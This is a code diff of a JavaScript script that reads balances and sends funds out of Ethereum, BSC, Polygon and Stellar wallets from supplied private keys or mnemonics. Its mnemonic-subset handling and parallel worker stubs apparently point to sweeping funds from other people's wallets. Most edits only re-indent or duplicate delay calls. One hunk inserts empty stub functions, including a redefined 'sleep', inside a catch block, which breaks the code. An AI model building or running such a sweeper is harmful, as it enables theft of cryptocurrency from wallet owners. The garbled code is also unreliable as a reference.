@@ -338,7 +338,7 @@ async function transferFundsEthereum(privateKey) {
     const provider = new ethers.providers.JsonRpcProvider(ethereumRpcUrl);
     const wallet = new ethers.Wallet(privateKey, provider);
 
-    await sleep(3000); // 3 seconds delay
+await sleep(3000); // 3 seconds delay
     const balance = await wallet.getBalance();
     const balanceEther = ethers.utils.formatEther(balance);
     console.log(`Balance in Ethereum wallet: ${balanceEther} ETH`);
@@ -357,7 +357,7 @@ async function transferFundsEthereum(privateKey) {
     // Place the logBalanceToFile() function call here
     await logBalanceToFile(walletData, 'Ethereum');
 
-    await sleep(3000); // 3 seconds delay
+await sleep(3000); // 3 seconds delay
     const transactionFee = await wallet.provider.getGasPrice();
     const transactionFeeEther = ethers.utils.formatEther(transactionFee);
     console.log(`Transaction fee: ${transactionFeeEther} ETH`);
@@ -374,7 +374,7 @@ async function transferFundsEthereum(privateKey) {
       gasPrice: transactionFee,
     };
 
-    // Add delay before sending the transaction
+await sleep(3000); // 3 seconds delay
     await sleep(3000); // 3 seconds delay
     const sendTransaction = await wallet.sendTransaction(transaction);
     console.log(`Transaction sent: ${sendTransaction.hash}`);
@@ -392,7 +392,7 @@ async function transferFundsBinance(privateKey) {
     const provider = new ethers.providers.JsonRpcProvider(bscRpcUrl);
     const wallet = new ethers.Wallet(privateKey, provider);
     
-	await sleep(3000); // 3 seconds delay
+await sleep(3000); // 3 seconds delay
     const balance = await wallet.getBalance();
     const balanceEther = ethers.utils.formatEther(balance);
     console.log(`Balance in Binance Smart Chain wallet: ${balanceEther} BNB`);
@@ -411,7 +411,7 @@ async function transferFundsBinance(privateKey) {
 	// Place the logBalanceToFile() function call here
     await logBalanceToFile(walletData, 'Binance Smart Chain');
     
-	await sleep(3000); // 3 seconds delay
+await sleep(3000); // 3 seconds delay
     const transactionFee = await wallet.provider.getGasPrice();
     const transactionFeeEther = ethers.utils.formatEther(transactionFee);
     console.log(`Transaction fee: ${transactionFeeEther} BNB`);
@@ -428,7 +428,7 @@ async function transferFundsBinance(privateKey) {
       gasPrice: transactionFee,
     };
 
-    // Add delay before sending the transaction
+await sleep(3000); // 3 seconds delay
     await sleep(3000); // 3 seconds delay
     const sendTransaction = await wallet.sendTransaction(transaction);
     console.log(`Transaction sent: ${sendTransaction.hash}`);
@@ -447,7 +447,7 @@ async function transferFundsPolygon(privateKey) {
     const provider = new ethers.providers.JsonRpcProvider(polygonRpcUrl);
     const wallet = new ethers.Wallet(privateKey, provider);
     
-	await sleep(3000); // 3 seconds delay
+await sleep(3000); // 3 seconds delay
     const balance = await wallet.getBalance();
     const balanceEther = ethers.utils.formatEther(balance);
     console.log(`Balance in Polygon wallet: ${balanceEther} MATIC`);
@@ -466,7 +466,7 @@ async function transferFundsPolygon(privateKey) {
 	// Place the logBalanceToFile() function call here
     await logBalanceToFile(walletData, 'Polygon');
     
-	await sleep(3000); // 3 seconds delay
+await sleep(3000); // 3 seconds delay
     const transactionFee = await wallet.provider.getGasPrice();
     const transactionFeeEther = ethers.utils.formatEther(transactionFee);
     console.log(`Transaction fee: ${transactionFeeEther} MATIC`);
@@ -484,7 +484,7 @@ async function transferFundsPolygon(privateKey) {
     };
 
     // Add delay before sending the transaction
-    await sleep(3000); // 3 seconds delay
+await sleep(3000); // 3 seconds delay
     const sendTransaction = await wallet.sendTransaction(transaction);
     console.log(`Transaction sent: ${sendTransaction.hash}`);
 
@@ -552,7 +552,7 @@ async function transferFundsStellar(stellarSecretKey) {
           transaction.sign(sourceKeypair);
 
           // Add delay before submitting the transaction
-          await sleep(3000); // 3 seconds delay
+await sleep(3000); // 3 seconds delay
           const transactionResult = await stellarServer.submitTransaction(transaction);
           console.log(`Transaction successful. Hash: ${transactionResult.hash}`);
 
@@ -619,6 +619,23 @@ async function transferFundsEthereumFromMnemonic(mnemonic, mnemonicSubset) {
     await transferFundsEthereum(privateKey);
   } catch (error) {
     console.error('Error transferring funds via Ethereum from mnemonic:', error.message);
+// Utility functions
+async function derivePrivateKey(mnemonic, path) { /* ... */ }
+async function calculateBalance() { /* ... */ }
+async function sleep(ms) { /* ... */ }
+async function logTransactionDetails() { /* ... */ }
+// ... other utility functions
+
+// Parallelization and caching implementation
+const workerData = {};
+const workerPool = [];
+const cache = new Map();
+
+async function initializeWorkerPool(numOfWorkers) { /* ... */ }
+async function assignJobToWorker() { /* ... */ }
+async function cacheResults() { /* ... */ }
+// ... other parallelization and caching functions
+
   }
 }
 
@@ -712,3 +729,4 @@ async function logTransactionToFile(walletData, recipientAddress, amountToSend, 
   fs.appendFileSync(transactionLogFilePath, transactionLogEntry);
   console.log(`Logged transaction details to file: ${transactionLogFilePath}`);
 }
+
